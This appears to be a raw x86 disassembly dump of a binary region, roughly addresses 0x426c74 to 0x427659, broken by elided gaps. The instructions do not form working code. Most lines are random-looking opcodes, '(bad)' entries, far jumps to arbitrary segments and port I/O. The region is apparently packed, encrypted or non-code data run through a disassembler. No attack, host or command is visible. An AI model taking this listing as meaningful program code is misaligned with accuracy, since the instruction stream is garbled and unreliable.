  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x1e3b37ad
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0xd5000001
  426c8d:	and    DWORD PTR [ebp-0x57410895],ebx
  426c93:	push   edx
  426c94:	xor    eax,0xc24a6882
  426c99:	pop    esp
  426c9a:	inc    edx
  426c9b:	pop    ebp
  426c9c:	(bad)  
  426c9d:	call   0x8d64a83a
  426ca2:	sti    
  426ca3:	nop
  426ca4:	push   0xffffffba
  426ca6:	pop    fs
  426ca8:	push   edx
  426ca9:	(bad)  
  426caa:	rol    BYTE PTR [esi-0x490764bd],1
  426cb0:	ficomp WORD PTR [ecx]
  426cb2:	outs   dx,DWORD PTR ds:[esi]
  426cb3:	ds dec edi
  426cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cb6:	les    ebp,FWORD PTR [edi+0x3948edfa]
  426cbc:	shl    ah,0x1e
  426cbf:	fdiv   DWORD PTR [esi+esi*1]
  426cc2:	(bad)  
  426cc4:	out    0x2,al
  426cc6:	cmc    
  426cc7:	and    al,0x35
  426cc9:	cld    
  426cca:	pusha  
  426ccb:	mov    edx,0xbc92d54b
  426cd0:	sbb    ecx,eax
  426cd2:	ret    
  426cd3:	add    bl,BYTE PTR [esi+0x675e4269]
  426cd9:	mov    ds,eax
  426cdb:	mov    BYTE PTR [edi],dh
  426cdd:	inc    edi
  426cde:	shl    BYTE PTR [edi],1
  426ce0:	add    cl,dl
  426ce2:	inc    ebp
  426ce3:	call   0x6c80:0xcb40cb6e
  426cea:	adc    eax,0xf973f0c9
  426cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cf0:	push   esp
  426cf1:	pop    eax
  426cf2:	out    dx,eax
  426cf3:	jmp    0x914a:0xfd74a46e
  426cfa:	adc    eax,0xde127141
  426cff:	data16 out dx,al
  426d01:	pushf  
  426d02:	imul   eax,DWORD PTR [esi-0x5554bcfc],0xfffffffb
  426d09:	adc    eax,0x14b9fca5
  426d0e:	sub    eax,0x246a8b3a
  426d13:	pop    ecx
  426d14:	lods   al,BYTE PTR ds:[esi]
  426d15:	fsub   DWORD PTR ds:0x3a12fd04
  426d1b:	stc    
  426d1c:	test   BYTE PTR ds:0x5dcc1b8,ah
  426d22:	scas   eax,DWORD PTR es:[edi]
  426d23:	int3   
  426d24:	test   eax,0x20345b6f
  426d29:	mov    WORD PTR [esi-0x1d],es
  426d2c:	jl     0x426d17
  426d2e:	push   es
  426d2f:	inc    eax
  426d30:	test   BYTE PTR [ebx+0x7df59332],dl
  426d36:	loope  0x426d9a
  426d38:	ret    
  426d39:	sbb    BYTE PTR [edx-0x75],bh
  426d3c:	in     al,dx
  426d3d:	cmc    
  426d3e:	mov    eax,DWORD PTR [esi-0x17966fd2]
  426d44:	push   0x8390a28b
  426d49:	cmp    al,0x50
  426d4b:	jge    0x426cee
  426d4d:	ror    DWORD PTR [eax],0xe4
  426d50:	cmp    al,0x2d
  426d52:	cwde   
  426d53:	sub    al,0xca
  426d55:	or     edx,DWORD PTR [ecx-0x58c5c3da]
  426d5b:	enter  0x56dc,0xec
  426d5f:	stos   DWORD PTR es:[edi],eax
  426d60:	jl     0x426d01
  426d62:	inc    ebx
  426d63:	hlt    
  426d64:	fs xchg ebx,eax
  426d66:	pop    ss
  426d67:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  426d69:	aam    0x5b
  426d6b:	mov    eax,ds:0x204d3390
  426d70:	jge    0x426d6f
  426d72:	lea    edx,[ecx+0x97a890]
  426d78:	mov    esp,0x389b5595
  426d7d:	out    dx,eax
  426d7e:	and    al,0x46
  426d80:	mov    ah,ah
  426d82:	push   ebx
  426d83:	adc    eax,0xa9febac5
  426d88:	lds    esi,FWORD PTR [edx-0x4b314808]
  426d8e:	je     0x426d53
  426d90:	mov    dh,0x0
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0xb0c:0xc7c2ecf9
  426e01:	mov    ds:0x9fce08a0,al
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x16000001
  426e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e0e:	in     eax,0x24
  426e10:	push   ss
  426e11:	sub    eax,0x4a4007df
  426e16:	inc    ebp
  426e17:	cmp    bh,bl
  426e19:	pop    edx
  426e1a:	(bad)  
  426e1b:	out    0xb9,al
  426e1d:	mov    al,0x59
  426e1f:	xlat   BYTE PTR ds:[ebx]
  426e20:	loope  0x426ded
  426e22:	rcr    BYTE PTR [esi+0x34],1
  426e25:	sbb    eax,0x7cfe9d73
  426e2a:	sub    dh,BYTE PTR [ecx+0x46]
  426e2d:	loop   0x426df8
  426e2f:	out    0x58,eax
  426e31:	je     0x426e00
  426e33:	inc    edi
  426e34:	sub    al,BYTE PTR [ecx+0x76]
  426e37:	mov    al,ds:0x21f221ee
  426e3c:	jle    0x426e72
  426e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e3f:	mov    esi,edx
  426e41:	lods   eax,DWORD PTR ds:[esi]
  426e42:	fs inc esp
  426e44:	xor    esi,esi
  426e46:	sbb    esp,esi
  426e48:	cmc    
  426e49:	push   ecx
  426e4a:	ds enter 0x2ec8,0x18
  426e4f:	dec    edi
  426e50:	mov    edx,0x6e89c5af
  426e55:	pop    ds
  426e56:	lods   eax,DWORD PTR ds:[esi]
  426e57:	fimul  DWORD PTR [ebx]
  426e59:	pop    esp
  426e5a:	add    al,0x40
  426e5c:	mov    edx,0xd36455c5
  426e61:	pop    edi
  426e62:	pop    edx
  426e63:	call   0x3821f469
  426e68:	pop    ds
  426e69:	xchg   ecx,eax
  426e6a:	ins    BYTE PTR es:[edi],dx
  426e6b:	adc    al,0x6a
  426e6d:	jl     0x426e84
  426e6f:	nop
  426e70:	xchg   edx,eax
  426e71:	sub    eax,0x5807c9ce
  426e76:	mov    dh,0x63
  426e78:	rcr    DWORD PTR [edi],cl
  426e7a:	mov    eax,0x4cdee926
  426e7f:	or     eax,0x1325e30f
  426e84:	jb     0x426e2f
  426e86:	stc    
  426e87:	cwde   
  426e88:	mov    ds:0x57e2a439,al
  426e8d:	leave  
  426e8e:	(bad)  
  426e8f:	in     al,dx
  426e90:	adc    dh,BYTE PTR [esp+ebp*2+0x6940f5b4]
  426e97:	jl     0x426ea5
  426e99:	push   0x617f0d64
  426e9e:	cmp    DWORD PTR [ecx+0x631fa480],esi
  426ea4:	push   esi
  426ea5:	fld    TBYTE PTR [ecx]
  426ea7:	or     eax,0x9106ebb8
  426eac:	mov    esp,0xd5a4a68f
  426eb1:	jae    0x426e67
  426eb3:	arpl   WORD PTR [esi],bp
  426eb5:	mov    esp,0x2023de11
  426eba:	push   cx
  426ebc:	xchg   esp,eax
  426ebd:	xlat   BYTE PTR ds:[ebx]
  426ebe:	out    0x64,al
  426ec0:	std    
  426ec1:	mov    ebx,0x405fd031
  426ec6:	addr16 out 0x19,al
  426ec9:	mov    ch,0x1b
  426ecb:	adc    dl,al
  426ecd:	mov    ch,0x74
  426ecf:	mul    BYTE PTR [ebp-0x24749282]
  426ed5:	xchg   edx,eax
  426ed6:	mov    edx,0xc25646e0
  426edb:	pop    edi
  426edc:	mov    eax,0x704372ee
  426ee1:	cmc    
  426ee2:	pop    ss
  426ee3:	ror    DWORD PTR [ebx+eiz*8-0x58bbd6c8],0x29
  426eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eec:	cmp    al,0x1b
  426eee:	and    ecx,DWORD PTR [edi+ebx*1-0x3a]
  426ef2:	cmp    al,0x15
  426ef4:	mov    BYTE PTR [edx],cl
  426ef6:	pusha  
  426ef7:	iret   
  426ef8:	jp     0x426eb4
  426efa:	rcl    bh,1
  426efc:	retf   0xcf81
  426eff:	inc    ebp
  426f00:	cld    
  426f01:	jmp    0x33cc:0x5693a7e6
  426f08:	cmc    
  426f09:	scas   eax,DWORD PTR es:[edi]
  426f0a:	pop    es
  426f0b:	out    0x37,al
  426f0d:	fiadd  DWORD PTR [ebx]
  426f0f:	lea    ebp,[edx]
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+ebp*1-0x2c336d8a],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	and    eax,0xd8ed8c27
  426f91:	enter  0xcedd,0x60
  426f95:	push   esi
  426f96:	jge    0x426f4a
  426f98:	cmp    esi,esi
  426f9a:	push   ebp
  426f9b:	pop    esi
  426f9d:	adc    eax,0xe2e54a41
  426fa2:	mov    ?,WORD PTR [esi]
  426fa4:	jbe    0x426f7e
  426fa6:	or     al,0x95
  426fa8:	jae    0x427016
  426faa:	dec    esp
  426fab:	mov    eax,0x75ec0e61
  426fb0:	or     DWORD PTR [ebx+ebx*4+0x3c5ff528],0x7e
  426fb8:	pushf  
  426fb9:	sti    
  426fba:	(bad)  
  426fbb:	push   ebx
  426fbc:	cmp    ch,BYTE PTR [esi]
  426fbe:	into   
  426fbf:	add    eax,0xaae70b7e
  426fc4:	pop    ecx
  426fc5:	sub    DWORD PTR [edx+0x60ed6288],edx
  426fcb:	shl    DWORD PTR [ebp+0x2457be6e],0xbe
  426fd2:	test   al,0x96
  426fd4:	inc    edi
  426fd5:	inc    ecx
  426fd6:	add    bh,dl
  426fd8:	jp     0x426ff9
  426fda:	adc    bh,dh
  426fdc:	mov    bl,0x3a
  426fde:	outs   dx,BYTE PTR ds:[esi]
  426fdf:	jnp    0x426f8f
  426fe1:	xchg   ebx,eax
  426fe2:	mov    eax,0x39b4c1b2
  426fe7:	push   ecx
  426fe8:	push   ss
  426fe9:	xchg   esi,eax
  426fea:	fsubr  QWORD PTR [ecx-0x33]
  426fed:	fsub   QWORD PTR [ecx+0x6b]
  426ff0:	mov    ss,WORD PTR es:[eax]
  426ff3:	test   al,0x4c
  426ff5:	jg     0x427028
  426ff7:	not    BYTE PTR [ebx+0x3c]
  426ffa:	ins    BYTE PTR es:[edi],dx
  426ffb:	(bad)  
  426ffc:	gs pop ds
  426ffe:	inc    eax
  426fff:	push   ss
  427000:	aas    
  427001:	add    al,0xd0
  427003:	sub    ebx,DWORD PTR [edi+0xfe0ab74]
  427009:	cdq    
  42700a:	dec    esi
  42700b:	(bad)  
  42700c:	jge    0x426fb3
  42700e:	test   BYTE PTR [ebx+0x48],bl
  427011:	pop    eax
  427012:	jmp    0x157e:0x742bf305
  427019:	popf   
  42701a:	int3   
  42701b:	fstp   TBYTE PTR [esi-0x76]
  42701e:	(bad)  
  427020:	sub    DWORD PTR [eax],ecx
  427022:	pushf  
  427023:	in     eax,0x30
  427025:	sahf   
  427026:	ins    DWORD PTR es:[edi],dx
  427027:	mov    bh,0xb0
  427029:	(bad)  
  42702a:	sbb    DWORD PTR [esi+0x45],ebx
  42702d:	test   ecx,edi
  42702f:	rol    DWORD PTR [eax+ebp*1],1
  427032:	sub    BYTE PTR [ebp-0x67],0xf
  427036:	sar    DWORD PTR [esi-0x29],cl
  427039:	jecxz  0x427057
  42703b:	pop    esi
  42703c:	out    0xef,al
  42703e:	dec    esp
  42703f:	mov    bh,0xe2
  427041:	mov    ch,0x45
  427043:	xchg   ebx,eax
  427044:	cmp    BYTE PTR [esi-0x2b4b24f2],0x5
  42704b:	pop    edx
  42704c:	scas   eax,DWORD PTR es:[edi]
  42704d:	outs   dx,BYTE PTR ds:[esi]
  42704e:	(bad)  [ebp+eax*4+0x6fc3b6f7]
  427055:	dec    ebx
  427056:	mov    ecx,DWORD PTR [ebp-0x54a2c993]
  42705c:	pop    ss
  42705d:	retf   
  42705e:	in     eax,0x24
  427060:	pop    ds
  427061:	scas   eax,DWORD PTR es:[edi]
  427062:	sbb    ah,0xe8
  427065:	jmp    0x427056
  427067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427068:	loop   0x4270d3
  42706a:	cmp    DWORD PTR [edi],eax
  42706c:	add    al,0x4
  42706e:	stc    
  42706f:	pop    ss
  427070:	inc    eax
  427071:	jl     0x427073
  427073:	jb     0x427037
  427075:	mov    bl,0xf4
  427077:	test   DWORD PTR [ecx+ebp*2],ebp
  42707a:	mov    cs,WORD PTR [esp+edi*2+0x7011983d]
  427081:	cmp    bl,BYTE PTR [edi+0x6299a777]
  427087:	in     eax,0xf4
  427089:	pop    eax
  42708a:	fisub  DWORD PTR [ecx]
  42708c:	push   ecx
  42708d:	mov    bh,BYTE PTR [edx+eax*8-0x2b]
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x6bf69d96
  427102:	stos   BYTE PTR es:[edi],al
  427103:	push   esi
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	pop    ds
  42710d:	leave  
  42710e:	xchg   esi,eax
  42710f:	dec    edi
  427110:	in     al,0x3c
  427112:	outs   dx,DWORD PTR ds:[esi]
  427113:	mov    ch,0xf6
  427115:	bswap  ebx
  427117:	lea    eax,[esi]
  427119:	fsubr  DWORD PTR [eax-0x79e57ef0]
  42711f:	ret    
  427120:	fsubr  QWORD PTR [edi+0x356ab7c4]
  427126:	jmp    0x42710a
  427128:	push   ebx
  427129:	xor    eax,0x863040d0
  42712e:	out    0x12,eax
  427130:	mov    esi,0x7cedb70c
  427135:	sub    eax,0x8db1792d
  42713a:	pop    edi
  42713b:	clc    
  42713c:	mov    bh,0xa7
  42713e:	inc    ecx
  42713f:	jg     0x42715d
  427141:	(bad)  
  427142:	jge    0x4270d4
  427144:	xchg   ebx,eax
  427145:	push   ebx
  427146:	fnsave ds:0xf5a9eb42
  42714c:	xchg   edx,eax
  42714d:	mov    esi,DWORD PTR [ecx+0x6c]
  427150:	test   al,0xee
  427152:	and    al,0x76
  427154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427155:	dec    ebx
  427156:	sahf   
  427157:	xchg   edx,eax
  427158:	push   esp
  427159:	adc    eax,0xa44a0af7
  42715e:	stc    
  42715f:	(bad)  
  427160:	xlat   BYTE PTR ds:[bx]
  427162:	sar    DWORD PTR [edx],cl
  427164:	push   esp
  427165:	push   ebp
  427166:	mov    al,0xc6
  427168:	nop
  427169:	jo     0x42717e
  42716b:	pusha  
  42716c:	or     al,0x56
  42716e:	jo     0x4271e2
  427170:	ins    DWORD PTR es:[edi],dx
  427171:	fild   DWORD PTR [edx+ebp*8+0x5c]
  427175:	xor    DWORD PTR [ecx+0x50],edx
  427178:	scas   eax,DWORD PTR es:[edi]
  427179:	jmp    0x29959fa2
  42717e:	jmp    0xf7c5fc38
  427183:	sub    BYTE PTR [edi-0x4],al
  427186:	xor    dl,BYTE PTR [esi+0x3b9b3c47]
  42718c:	lods   eax,DWORD PTR ds:[esi]
  42718d:	icebp  
  42718e:	jb     0x4271ee
  427190:	mov    ds:0x9cc281a8,al
  427195:	(bad)  
  427196:	je     0x42712e
  427198:	sahf   
  427199:	sar    dl,0x27
  42719c:	inc    esi
  42719d:	push   ebp
  42719e:	sub    edx,esp
  4271a0:	xor    DWORD PTR [eax-0x5aa1f454],edx
  4271a6:	sbb    ch,dh
  4271a8:	pop    ebp
  4271a9:	rol    DWORD PTR [ecx-0x2bccc841],0x18
  4271b0:	sti    
  4271b1:	hlt    
  4271b2:	push   ebx
  4271b3:	arpl   dx,bx
  4271b5:	add    DWORD PTR ds:0xa44643d0,0x36ade87b
  4271bf:	pop    edi
  4271c0:	imul   edx,DWORD PTR [ebx-0x1cc36455],0x18
  4271c7:	jp     0x4271ee
  4271c9:	inc    ecx
  4271ca:	cmp    BYTE PTR [ebx],ah
  4271cc:	mov    DWORD PTR ds:0x8b67502f,eax
  4271d2:	push   es
  4271d3:	fs mov eax,0x2526e16c
  4271d9:	cli    
  4271da:	jb     0x4271b1
  4271dc:	mov    esp,ebp
  4271de:	or     ch,BYTE PTR [esi+0x31]
  4271e1:	cmp    ecx,ecx
  4271e3:	add    BYTE PTR [ecx-0x516f08b],dh
  4271e9:	xchg   edx,eax
  4271ea:	out    dx,eax
  4271eb:	add    DWORD PTR ds:0x359c0932,edx
  4271f1:	add    DWORD PTR [edi],ecx
  4271f3:	jmp    0xbf1f:0xeacebe99
  4271fa:	ficom  DWORD PTR [edx+edx*1+0x70cf7e39]
  427201:	mov    ecx,0xcc01e851
  427206:	xor    al,0x57
  427208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427209:	call   0x5fb4:0x8899d43e
  427210:	or     eax,DWORD PTR [eax]
	...
  427272:	add    BYTE PTR [eax],al
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xd2039623,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	dec    ebx
  42728d:	imul   esp,DWORD PTR [edx+0x4908190c],0xfffffff0
  427294:	xor    BYTE PTR [ecx+0x3fe290f9],dl
  42729a:	push   0x4c
  42729c:	sbb    bl,cl
  42729e:	mov    DWORD PTR [eax],ebp
  4272a0:	outs   dx,DWORD PTR ds:[esi]
  4272a1:	ds pusha 
  4272a3:	adc    bh,dl
  4272a5:	stc    
  4272a6:	aas    
  4272a7:	sbb    al,cl
  4272a9:	lods   al,BYTE PTR ds:[esi]
  4272aa:	clc    
  4272ab:	loopne 0x427275
  4272ad:	push   ebx
  4272ae:	mov    esi,0x5eb30cef
  4272b3:	inc    esi
  4272b4:	push   edx
  4272b5:	push   edx
  4272b6:	mov    bl,0x8c
  4272b9:	loope  0x4272ae
  4272bb:	mov    eax,0xcfa8d0d9
  4272c0:	mov    eax,ds:0x20d32f92
  4272c5:	jmp    0x4272b9
  4272c7:	add    DWORD PTR [ebx-0x39],esi
  4272ca:	icebp  
  4272cb:	push   eax
  4272cc:	jge    0x4272f2
  4272ce:	cwde   
  4272cf:	push   esi
  4272d0:	(bad)  
  4272d3:	in     al,dx
  4272d4:	enter  0x1d57,0xe9
  4272d8:	loopne 0x427283
  4272da:	xor    ebx,DWORD PTR [edx-0x288b0abb]
  4272e0:	in     eax,0x9b
  4272e2:	pop    ebp
  4272e3:	fisub  WORD PTR es:[eax+0x2d]
  4272e7:	add    cl,BYTE PTR [edi]
  4272e9:	and    BYTE PTR [ebp+0x58],0xa4
  4272ed:	adc    esi,DWORD PTR [eax]
  4272ef:	push   cs
  4272f0:	add    dh,BYTE PTR [ecx-0x25]
  4272f3:	cmp    DWORD PTR [eax],ebp
  4272f5:	(bad)  
  4272f7:	std    
  4272f8:	mov    bh,0x78
  4272fa:	lds    edi,FWORD PTR [ecx]
  4272fc:	repnz lahf 
  4272fe:	retf   0x5e4c
  427301:	inc    eax
  427302:	imul   eax,DWORD PTR ds:0xed13e74b,0xbf5eb158
  42730c:	adc    ecx,DWORD PTR [ecx+ebx*4]
  42730f:	xor    al,0xa5
  427311:	dec    edi
  427312:	jp     0x4272d1
  427314:	push   esp
  427315:	cdq    
  427316:	push   edi
  427317:	mov    BYTE PTR [eax+0x25d038f9],0xc7
  42731e:	pop    ebp
  42731f:	nop
  427320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427321:	cld    
  427322:	mov    ch,0x36
  427324:	cmp    BYTE PTR [esi],al
  427326:	js     0x42737c
  427328:	rcr    DWORD PTR [edx+0x74d65b0a],1
  42732e:	ficomp DWORD PTR [esi]
  427330:	(bad)  
  427331:	cmp    ah,dh
  427333:	push   ecx
  427334:	jecxz  0x42736b
  427336:	xchg   edx,eax
  427337:	outs   dx,BYTE PTR ds:[esi]
  427338:	dec    eax
  427339:	js     0x4273a8
  42733b:	cdq    
  42733c:	in     al,0xa8
  42733e:	pop    edx
  42733f:	and    DWORD PTR [eax-0x31],ebx
  427342:	xchg   edi,eax
  427343:	xchg   BYTE PTR [edi-0x7b],al
  427346:	jecxz  0x42735e
  427348:	jle    0x427393
  42734a:	inc    ecx
  42734b:	mov    al,ds:0x90eb4768
  427350:	call   0x82dd7297
  427355:	ficomp WORD PTR [ecx+eax*2]
  427358:	mov    DWORD PTR [edi+0x1a],esi
  42735b:	xor    al,0x2f
  42735d:	xor    eax,0x278cdc1
  427362:	jmp    0x936b3934
  427367:	add    bl,bl
  427369:	sbb    al,0x49
  42736b:	je     0x427338
  42736d:	popfw  
  42736f:	sbb    eax,edx
  427371:	cdq    
  427372:	sbb    bl,dl
  427374:	mov    WORD PTR [ebx],?
  427376:	push   ebp
  427377:	pop    eax
  427378:	jge    0x42730a
  42737a:	push   eax
  42737b:	cli    
  42737c:	stos   BYTE PTR es:[edi],al
  42737d:	ret    0x678a
  427380:	or     ebp,DWORD PTR ds:0x7f1d0420
  427386:	sbb    ah,cl
  427388:	loopne 0x42736f
  42738a:	jb     0x4273df
  42738c:	pop    esp
  42738d:	xchg   ebx,eax
  42738e:	ja     0x42740b
  427390:	pushf  
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,DWORD PTR ds:0xe2ce125f
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	or     eax,0x4578f0e3
  427411:	ret    0xeed4
  427414:	xor    eax,0x43d7a2a6
  427419:	pop    edi
  42741a:	div    BYTE PTR [esi+0x7a4db0eb]
  427420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427421:	arpl   bp,ax
  427423:	jp     0x42743a
  427425:	push   esp
  427426:	loop   0x4273b1
  427428:	xchg   DWORD PTR [eax-0x5f2ae907],ebp
  42742e:	retf   
  42742f:	push   ds
  427430:	inc    edx
  427431:	jne    0x4273eb
  427433:	sub    dh,BYTE PTR [ecx+0x5d6ef754]
  427439:	ret    
  42743a:	rep lods eax,DWORD PTR ds:[esi]
  42743c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42743d:	jecxz  0x427443
  42743f:	stos   BYTE PTR es:[edi],al
  427440:	jns    0x42744b
  427442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427443:	aam    0xf
  427445:	jae    0x4273e0
  427447:	jne    0x4274b0
  427449:	imul   ecx,DWORD PTR [ecx+0x7f3e0e36],0xfffffff3
  427450:	or     ah,dh
  427452:	jb     0x4273f5
  427454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427455:	jmp    0x427433
  427457:	xor    al,0xa4
  427459:	or     DWORD PTR [ecx+0x6e],ebp
  42745c:	push   ecx
  42745d:	fbstp  TBYTE PTR [ecx+0x68cb73e0]
  427463:	xor    al,0x24
  427465:	pop    es
  427466:	jne    0x42749f
  427468:	mov    bh,0x52
  42746a:	push   DWORD PTR [ebp+edi*1-0x21]
  42746e:	(bad)  
  42746f:	sub    esi,esi
  427471:	pop    DWORD PTR [edx-0x3b]
  427474:	pop    esp
  427475:	mov    edi,0x48e571d5
  42747a:	mov    al,ds:0x96c9f3c
  42747f:	and    BYTE PTR [esp+ecx*8-0x609cc5da],bl
  427486:	(bad)  
  427487:	scas   eax,DWORD PTR es:[edi]
  427488:	pop    eax
  427489:	adc    DWORD PTR [edi+0xe],edx
  42748c:	xlat   BYTE PTR ds:[ebx]
  42748d:	xchg   ebx,eax
  42748e:	(bad)  
  42748f:	jp     0x4274eb
  427491:	inc    eax
  427492:	mov    ds:0x1c2f7be5,eax
  427497:	mov    ss,WORD PTR [ebx]
  427499:	and    eax,0xe0bcaaee
  42749e:	int    0x60
  4274a0:	sub    DWORD PTR [esi+0x539c04e9],esi
  4274a6:	cdq    
  4274a7:	enter  0xc156,0x58
  4274ab:	test   eax,0x18d477ff
  4274b0:	div    al
  4274b2:	push   cs
  4274b3:	test   BYTE PTR [edx],0x13
  4274b6:	and    al,0x6f
  4274b8:	mov    ch,0x65
  4274ba:	mov    edi,0xed703c9d
  4274bf:	mov    BYTE PTR [esi+0x4e],dl
  4274c2:	sub    eax,0xa444e79d
  4274c7:	xchg   esp,eax
  4274c8:	call   0x66f70eca
  4274cd:	sub    BYTE PTR [ebp+ecx*8+0xea41234],ch
  4274d4:	test   al,0x46
  4274d6:	push   eax
  4274d7:	xor    eax,0xb735326c
  4274dc:	cs inc ebx
  4274de:	xor    dl,bl
  4274e0:	dec    edx
  4274e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274e2:	or     eax,0x106b47ce
  4274e7:	or     BYTE PTR [edi-0x2b0792f2],al
  4274ed:	stos   BYTE PTR es:[edi],al
  4274ee:	sub    DWORD PTR [eax+0x42],ebp
  4274f1:	scas   eax,DWORD PTR es:[edi]
  4274f2:	and    DWORD PTR [ecx],edx
  4274f4:	jb     0x42752e
  4274f6:	dec    eax
  4274f7:	pop    edx
  4274f8:	fld    DWORD PTR [edi-0x499ddc49]
  4274fe:	pop    esi
  4274ff:	push   ss
  427500:	push   es
  427501:	push   0x77
  427503:	push   edx
  427504:	cmp    ebx,DWORD PTR [edi]
  427506:	xchg   ebx,eax
  427507:	mov    ah,0x6d
  427509:	pop    ecx
  42750a:	sbb    edx,DWORD PTR ds:0xbf1ba926
  427510:	jge    0x427512
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	xor    BYTE PTR [esi],dh
  427582:	stc    
  427583:	sub    esp,edi
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0xb4000001
  42758d:	enter  0xabdf,0x17
  427591:	leave  
  427592:	addr16 mov ds:0x24c5,al
  427596:	and    ch,ch
  427598:	mov    ebx,0x484d6e12
  42759d:	or     ebp,DWORD PTR [bx+di]
  4275a0:	not    ecx
  4275a2:	in     eax,dx
  4275a3:	jne    0x427537
  4275a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275a6:	pushf  
  4275a7:	daa    
  4275a8:	cdq    
  4275a9:	sbb    edx,esi
  4275ab:	outs   dx,BYTE PTR ds:[esi]
  4275ac:	mov    bh,0xc9
  4275ae:	inc    esi
  4275af:	add    eax,0x64af5670
  4275b4:	sbb    al,0x6f
  4275b6:	scas   al,BYTE PTR es:[edi]
  4275b7:	push   es
  4275b8:	leave  
  4275b9:	jle    0x4275c6
  4275bb:	xlat   BYTE PTR ds:[ebx]
  4275bc:	(bad)  
  4275bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275be:	imul   esi,edx,0xfe600a6d
  4275c4:	ret    
  4275c5:	jmp    0x2938906
  4275ca:	and    ebx,ebp
  4275cc:	xchg   esi,eax
  4275cd:	sbb    dh,BYTE PTR [edx]
  4275cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275d0:	cli    
  4275d1:	cdq    
  4275d2:	or     eax,0x68619a1
  4275d7:	(bad)  
  4275d8:	in     eax,0x26
  4275da:	dec    edx
  4275db:	in     eax,dx
  4275dc:	jg     0x42761a
  4275de:	mov    bh,0x50
  4275e0:	fdivr  st,st(1)
  4275e2:	out    0x6,eax
  4275e4:	test   al,0xab
  4275e6:	and    BYTE PTR [ecx+0x1405b5a9],dl
  4275ec:	pusha  
  4275ed:	push   0xbd2370ce
  4275f2:	test   BYTE PTR [ebp-0x57],bl
  4275f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275f6:	xlat   BYTE PTR ds:[ebx]
  4275f7:	dec    esi
  4275f8:	retf   
  4275f9:	dec    ebx
  4275fa:	aam    0x82
  4275fc:	iret   
  4275fd:	cmp    eax,0xc4c6c425
  427602:	mov    ebp,0xaf5c28ca
  427607:	out    dx,al
  427608:	stos   BYTE PTR es:[edi],al
  427609:	sub    al,0x3f
  42760b:	xchg   esp,eax
  42760c:	jmp    0x2173:0x1100bbd7
  427613:	adc    dl,bl
  427615:	rol    BYTE PTR [esi+0x6],1
  427618:	xor    bh,BYTE PTR [eax+eax*4-0x1f]
  42761c:	jae    0x4275e2
  42761e:	inc    edi
  42761f:	pop    ebx
  427620:	ror    DWORD PTR [eax],0xca
  427623:	into   
  427624:	jle    0x427640
  427626:	into   
  427627:	loop   0x4275ee
  427629:	inc    ecx
  42762a:	mov    edi,0xfd52d47b
  42762f:	and    al,0x28
  427631:	mov    al,0x16
  427633:	(bad)  
  427634:	shl    al,cl
  427636:	cmp    dl,BYTE PTR ss:[ebx+0x4a]
  42763a:	aad    0xe2
  42763c:	shr    DWORD PTR [ebx],1
  42763e:	inc    edx
  42763f:	jae    0x4275ca
  427641:	pop    DWORD PTR [edi+ebx*1+0x51]
  427645:	lahf   
  427646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427647:	xor    al,0xaa
  427649:	enter  0xd62d,0x55
  42764d:	retf   0x17f4
  427650:	clc    
  427651:	sbb    ebp,DWORD PTR [ebx+0xf]
  427654:	and    eax,0xe4c69e7b
  427659:	or     eax,0x48b93953
